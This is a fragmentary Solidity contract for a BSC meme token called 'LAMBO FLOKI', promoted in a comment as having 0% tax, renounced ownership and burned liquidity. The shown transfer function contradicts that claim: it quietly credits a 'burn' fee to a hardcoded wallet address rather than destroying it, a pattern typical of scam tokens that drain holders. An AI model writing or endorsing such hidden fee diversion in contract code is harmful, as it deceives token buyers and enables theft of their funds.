...
// Submitted for Telegram: https://t.me/LamboflokiBsc

// Lambo Floki | Tax 0% | Renounce Own | LP Burn
...
contract  LAMBOFLOKI  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "LAMBO FLOKI";
    string private _symbol = "$LFO";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xfb5B838b6cfEEdC2873aB27866079AC55363D37E] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0xfb5B838b6cfEEdC2873aB27866079AC55363D37E, _bruntoken);
        }
